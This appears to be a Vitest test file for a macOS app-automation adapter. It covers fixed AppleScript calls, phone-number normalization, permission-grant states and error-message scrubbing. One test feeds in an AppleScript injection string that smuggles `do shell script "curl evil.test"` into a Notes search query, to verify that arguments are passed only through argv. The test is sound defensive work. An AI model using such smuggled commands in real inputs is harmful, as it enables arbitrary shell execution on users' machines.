import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { MacAppCall } from "@robots/adapters/mac-apps-protocol";
import { MacAppError } from "@robots/adapters/mac-apps-protocol";
import type { MacGrantId } from "@robots/contracts";
import { afterAll, describe, expect, it, vi } from "vitest";
import type { ScriptRunner } from "./mac-apps.js";
import {
  createDesktopMacApps,
  createMacApps,
  FULL_DISK_ACCESS_MESSAGE,
  macAppFailure,
  normalizedHandle,
} from "./mac-apps.js";
import { MAC_TOOL_SCRIPTS } from "./mac-apps-scripts.js";
import type { MacPermissionProbes } from "./mac-permissions.js";
import {
  automationErrorCode,
  automationStatusFromCode,
  createMacPermissions,
  fileAccessStatus,
  locationStatusFromCode,
} from "./mac-permissions.js";

const signal = new AbortController().signal;
const homes = mkdtempSync(path.join(tmpdir(), "robots-mac-home-"));
afterAll(() => {
  chmodSync(homes, 0o700);
  rmSync(homes, { recursive: true, force: true });
});

function osascriptError(message: string) {
  return new Error(`execution error: ${message}`);
}

describe("createMacApps", () => {
  it("runs the tool's fixed script and hands it the arguments only through argv", async () => {
    const runScript = vi.fn<ScriptRunner>(async () => '{"notes":[]}');
    const macApps = createMacApps({ home: homes, runScript });
    const query = `" & do shell script "curl evil.test" & "`;
    await expect(
      macApps.run({ tool: "mac_notes_search", args: { query, limit: 5 } }, signal),
    ).resolves.toEqual({ notes: [] });
    expect(runScript).toHaveBeenCalledWith(
      MAC_TOOL_SCRIPTS.mac_notes_search,
      [JSON.stringify({ query, limit: 5 })],
      signal,
    );
    expect(MAC_TOOL_SCRIPTS.mac_notes_search).not.toContain("curl");
  });

  it("normalizes a phone number before Messages sees it", async () => {
    const runScript = vi.fn<ScriptRunner>(async () => '{"sent":true}');
    await createMacApps({ home: homes, runScript }).run(
      { tool: "mac_messages_send", args: { to: "+1 (555) 010-0100", text: "hi" } },
      signal,
    );
    expect(runScript.mock.calls[0]![1]).toEqual([
      JSON.stringify({ to: "+15550100100", text: "hi" }),
    ]);
    expect(normalizedHandle(" ana@example.test ")).toBe("ana@example.test");
  });

  it("gives location only a time limit", async () => {
    const runScript = vi.fn<ScriptRunner>(
      async () => '{"latitude":1,"longitude":2,"accuracy_m":65}',
    );
    await createMacApps({ home: homes, runScript }).run(
      { tool: "mac_location_current", args: {} },
      signal,
    );
    expect(runScript.mock.calls[0]![1]).toEqual([JSON.stringify({ timeoutMs: 20_000 })]);
  });

  it("remembers a refused Automation grant", async () => {
    const remember = vi.fn();
    const macApps = createMacApps({
      home: homes,
      runScript: async () => {
        throw osascriptError("Not authorized to send Apple events to Mail. (-1743)");
      },
      permissions: { remember } as never,
    });
    await expect(
      macApps.run(
        { tool: "mac_mail_read", args: { id: 3, mailbox: "inbox", max_chars: 500 } },
        signal,
      ),
    ).rejects.toThrow("RoBots is not allowed to control Mail on this Mac.");
    expect(remember).toHaveBeenCalledWith("automation-mail", "denied");
  });

  it("asks for Full Disk Access when the Messages history cannot be opened", async () => {
    const home = path.join(homes, "locked");
    const messages = path.join(home, "Library", "Messages");
    mkdirSync(messages, { recursive: true });
    writeFileSync(path.join(messages, "chat.db"), "");
    chmodSync(path.join(messages, "chat.db"), 0o000);
    const openDatabase = vi.fn();
    const macApps = createMacApps({ home, openDatabase });
    await expect(
      macApps.run({ tool: "mac_messages_chats", args: { limit: 5 } }, signal),
    ).rejects.toThrow(FULL_DISK_ACCESS_MESSAGE);
    expect(openDatabase).not.toHaveBeenCalled();
    await expect(
      createMacApps({ home: path.join(homes, "empty") }).run(
        { tool: "mac_messages_read", args: { chat_id: 1, limit: 5 } },
        signal,
      ),
    ).rejects.toThrow("Messages has no history on this Mac.");
  });

  it("does not pass on an answer it cannot read", async () => {
    await expect(
      createMacApps({ home: homes, runScript: async () => "not json" }).run(
        { tool: "mac_contacts_search", args: { query: "Ana", limit: 5 } },
        signal,
      ),
    ).rejects.toThrow("Contacts gave an answer RoBots could not read.");
  });
});

describe("macAppFailure", () => {
  const read: MacAppCall = {
    tool: "mac_notes_read",
    args: { id: "x-coredata://A/ICNote/p1", max_chars: 500 },
  };
  it.each([
    ["ROBOTS:not-found (-2700)", "That note was not found in Notes."],
    ['Can\'t get note id "x". (-1728)', "That note was not found in Notes."],
    [
      "Application isn't running. (-600)",
      "Notes did not open. Ask the user to open it once, then try again.",
    ],
    ["AppleEvent timed out. (-1712)", "Notes took too long to answer. Try again."],
    [
      "Not authorized to send Apple events to Notes. (-1743)",
      expect.stringContaining("Privacy & Security > Automation"),
    ],
    ["Error: secret contents of my note (-2700)", "Notes could not do that on this Mac."],
  ])("turns %s into a message that reveals nothing else", (stderr, message) => {
    const failure = macAppFailure(read, osascriptError(stderr));
    expect(failure).toBeInstanceOf(MacAppError);
    expect(failure.message).toEqual(message);
    expect(failure.message).not.toContain("secret");
  });

  it("explains location failures", () => {
    const location: MacAppCall = { tool: "mac_location_current", args: {} };
    expect(
      macAppFailure(location, osascriptError("Error: ROBOTS:location-denied (-2700)")).message,
    ).toContain("not allowed to use this Mac's location");
    expect(
      macAppFailure(location, osascriptError("Error: ROBOTS:location-off (-2700)")).message,
    ).toContain("Location Services is off");
  });
});

describe("Mac permission states", () => {
  it("maps macOS answers to grant states", () => {
    expect(automationStatusFromCode(0)).toBe("granted");
    expect(automationStatusFromCode(-1743)).toBe("denied");
    expect(automationStatusFromCode(-1744)).toBe("not-determined");
    expect(automationStatusFromCode(-600)).toBeNull();
    expect(automationStatusFromCode(null)).toBeNull();
    expect(locationStatusFromCode({ enabled: false, status: 3 })).toBe("unavailable");
    expect(locationStatusFromCode({ enabled: true, status: 0 })).toBe("not-determined");
    expect(locationStatusFromCode({ enabled: true, status: 2 })).toBe("denied");
    expect(locationStatusFromCode({ enabled: true, status: 4 })).toBe("granted");
    expect(fileAccessStatus(undefined)).toBe("granted");
    expect(fileAccessStatus("EPERM")).toBe("denied");
    expect(fileAccessStatus("ENOENT")).toBe("unavailable");
    expect(automationErrorCode(osascriptError("Not authorized. (-1743)"))).toBe(-1743);
    expect(automationErrorCode(new Error("plain"))).toBeNull();
  });

  function probes(overrides: Partial<MacPermissionProbes> = {}) {
    const opened: string[] = [];
    const base: MacPermissionProbes = {
      automation: async () => -1744,
      promptAutomation: async () => undefined,
      location: async () => ({ enabled: true, status: 0 }),
      promptLocation: async () => undefined,
      messagesDatabase: async () => "EPERM",
      openSettings: async (url) => void opened.push(url),
      ...overrides,
    };
    return { probes: base, opened };
  }

  it("reports every grant", async () => {
    const { probes: fake } = probes();
    const states = await createMacPermissions(fake).states();
    expect(states).toEqual([
      { grant: "automation-mail", status: "not-determined" },
      { grant: "automation-messages", status: "not-determined" },
      { grant: "automation-notes", status: "not-determined" },
      { grant: "automation-reminders", status: "not-determined" },
      { grant: "automation-calendar", status: "not-determined" },
      { grant: "automation-contacts", status: "not-determined" },
      { grant: "full-disk-access", status: "denied" },
      { grant: "location", status: "not-determined" },
    ]);
  });

  it("asks macOS first and opens System Settings only when still not allowed", async () => {
    const answers = [-1744, 0];
    const prompted: string[] = [];
    const granted = probes({
      automation: async () => answers.shift() ?? 0,
      promptAutomation: async (bundle) => void prompted.push(bundle),
    });
    await createMacPermissions(granted.probes).allow("automation-calendar");
    expect(prompted).toEqual(["com.apple.iCal"]);
    expect(granted.opened).toEqual([]);

    const refused = probes({
      automation: async () => -1744,
      promptAutomation: async () => {
        throw osascriptError("Not authorized to send Apple events to Notes. (-1743)");
      },
    });
    const permissions = createMacPermissions(refused.probes);
    await permissions.allow("automation-notes");
    expect(refused.opened).toEqual([
      "x-apple.systempreferences:com.apple.preference.security?Privacy_Automation",
    ]);
  });

  it("keeps the last known Automation answer while the app is closed", async () => {
    const answers = [-1743, -600];
    const permissions = createMacPermissions(
      probes({ automation: async () => answers.shift() ?? -600 }).probes,
    );
    expect(await permissions.status("automation-mail")).toBe("denied");
    expect(await permissions.status("automation-mail")).toBe("denied");
  });

  it.each<[MacGrantId, string]>([
    [
      "full-disk-access",
      "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles",
    ],
    [
      "location",
      "x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices",
    ],
  ])("opens the right pane for %s", async (grant, url) => {
    const fake = probes({ location: async () => ({ enabled: true, status: 2 }) });
    await createMacPermissions(fake.probes).allow(grant);
    expect(fake.opened).toEqual([url]);
  });

  it("prompts for location before sending anyone to System Settings", async () => {
    const statuses = [0, 4];
    const promptLocation = vi.fn(async () => undefined);
    const fake = probes({
      location: async () => ({ enabled: true, status: statuses.shift() ?? 4 }),
      promptLocation,
    });
    await createMacPermissions(fake.probes).allow("location");
    expect(promptLocation).toHaveBeenCalledOnce();
    expect(fake.opened).toEqual([]);
  });

  it("wires the desktop probes to fixed scripts", async () => {
    const scripts: string[][] = [];
    const { permissions } = createDesktopMacApps({
      home: homes,
      openSettings: async () => undefined,
      automationCode: () => 0,
      runScript: async (_script, args) => {
        scripts.push(args);
        return JSON.stringify({ enabled: true, status: 3 });
      },
    });
    expect(await permissions.status("location")).toBe("granted");
    expect(await permissions.status("automation-contacts")).toBe("granted");
    expect(await permissions.status("full-disk-access")).toBe("unavailable");
    expect(scripts).toEqual([[]]);
  });
});
